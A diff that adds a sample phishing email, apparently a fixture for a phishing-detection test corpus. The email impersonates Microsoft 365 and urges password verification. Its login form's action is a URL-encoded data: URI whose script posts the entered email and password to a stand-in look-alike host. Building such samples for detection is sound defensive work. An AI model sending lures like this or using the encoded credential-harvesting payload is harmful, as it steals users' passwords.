@@ -1,0 +1,22 @@
+From: Microsoft 365 Security <security@phishing.test>
+To: security-review@victim.example
+Date: Thu, 13 Aug 2026 10:00:00 +0000
+Message-ID: <msg-1870-data-uri-form-action@corpus.phishing.test>
+Subject: Complete your Microsoft 365 security verification
+MIME-Version: 1.0
+Content-Type: text/html; charset="utf-8"
+Content-Transfer-Encoding: 8bit
+
+<!doctype html>
+<html lang="en">
+<head><meta charset="utf-8"><title>Security verification</title></head>
+<body>
+  <h1>Microsoft 365 security verification</h1>
+  <p>Your mailbox will be suspended unless you verify your password today.</p>
+  <form method="post" action="data:text/html,%3Cscript%3Efetch(%27https%3A%2F%2Fmicros0ft-login.evil.example%2Fcollect%27,%7Bmethod%3A%27POST%27,body%3Anew%20FormData(document.forms%5B0%5D)%7D)%3C%2Fscript%3E">
+    <label>Email <input name="email" type="email"></label>
+    <label>Password <input name="password" type="password"></label>
+    <button type="submit">Verify account</button>
+  </form>
+</body>
+</html>
